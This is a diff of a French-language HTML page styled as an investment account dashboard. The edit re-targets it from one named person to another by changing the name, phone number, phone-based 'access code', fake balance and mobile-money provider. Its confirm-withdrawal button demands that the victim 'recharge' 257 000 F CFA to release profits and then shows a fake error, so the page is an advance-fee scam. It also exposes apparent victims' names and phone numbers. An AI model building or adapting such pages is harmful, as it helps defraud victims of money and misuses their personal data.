@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "66756786") {
+        if (code === "97774569") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 600 000 F CFA</span>
+                <span class="balance">Solde: 380 000 F CFA</span>
                 <div class="account-info">
-                    <span id="user-name"> Marie Constantine Lawsou Ki </span><br>
-                    <span id="user-phone">226 66 75 67 86</span>
+                    <span id="user-name"> Eklou Isabelle </span><br>
+                    <span id="user-phone">228 97 77 45 69</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +277,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Orange Money</button>
+                <button id="orange-money">Retirer via Flooz Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -310,17 +310,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "Marie Constantine Lawsou Ki";
-                const accountNumber = "226 66 75 67 86";
-                const balance = "600 000 F CFA";
+                const accountName = "Eklou Isabelle";
+                const accountNumber = "228 97 77 45 69";
+                const balance = "380 000 F CFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Orange Money ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Flooz Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Orange money");
+                    setWithdrawalInfo("Flooz money");
                 }
             });
 
@@ -332,7 +332,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher Constantine, veuillez recharger votre compte d\'un montant de 200 000 F CFA afin de recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher Eklou, veuillez recharger votre compte d\'un montant de 257 000 F CFA afin de recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Erreur inatendue.';
